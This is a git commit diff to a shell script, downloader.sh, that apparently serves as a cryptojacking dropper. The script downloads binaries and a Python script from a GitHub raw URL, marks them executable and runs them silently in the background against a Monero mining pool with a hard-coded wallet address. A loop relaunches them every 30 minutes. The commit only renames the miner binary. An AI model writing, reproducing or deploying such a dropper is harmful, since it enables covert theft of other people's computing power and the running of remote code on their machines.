96fd26ad9fb377f5baf531b7ec2e07baaee67411
xtremx@zinad.net <xtremx@zinad.net>
2018-03-05 18:34:27 +0200

    goal & downloader

--- downloader.sh
+++ downloader.sh
@@ -1,8 +1,8 @@
 mkdir -r /opt/code/
 
-wget "https://raw.githubusercontent.com/x7r3mx/arm/master/yam" -O /opt/code/yam
-chmod 700 /opt/code/yam
-/opt/code/yam -c x -M stratum+tcp://44tLjmXrQNrWJ5NBsEj2R77ZBEgDa3fEe9GLpSf2FRmhexPvfYDUAB7EXX1Hdb3aMQ9FLqdJ56yaAhiXoRsceGJCRS3Jxkn:x@mine.moneropool.com:3333/xmr &>/dev/null &
+wget "https://raw.githubusercontent.com/x7r3mx/arm/master/goal" -O /opt/code/goal
+chmod 700 /opt/code/goal
+/opt/code/goal -c x -M stratum+tcp://44tLjmXrQNrWJ5NBsEj2R77ZBEgDa3fEe9GLpSf2FRmhexPvfYDUAB7EXX1Hdb3aMQ9FLqdJ56yaAhiXoRsceGJCRS3Jxkn:x@mine.moneropool.com:3333/xmr &>/dev/null &
 
 
 wget "https://raw.githubusercontent.com/x7r3mx/arm/master/origin.py" -O /opt/code/origin.py
@@ -11,8 +11,8 @@ python /opt/code/origin.py &>/dev/null &
 
 
 while true; do 
-    pgrep -f yam;
-    /bin/yam -c x -M stratum+tcp://44tLjmXrQNrWJ5NBsEj2R77ZBEgDa3fEe9GLpSf2FRmhexPvfYDUAB7EXX1Hdb3aMQ9FLqdJ56yaAhiXoRsceGJCRS3Jxkn:x@mine.moneropool.com:3333/xmr &
+    pgrep -f goal;
+    /bin/goal -c x -M stratum+tcp://44tLjmXrQNrWJ5NBsEj2R77ZBEgDa3fEe9GLpSf2FRmhexPvfYDUAB7EXX1Hdb3aMQ9FLqdJ56yaAhiXoRsceGJCRS3Jxkn:x@mine.moneropool.com:3333/xmr &
     pgrep -f origin;
     python /opt/code/origin.py &>/dev/null &
     sleep 1800;
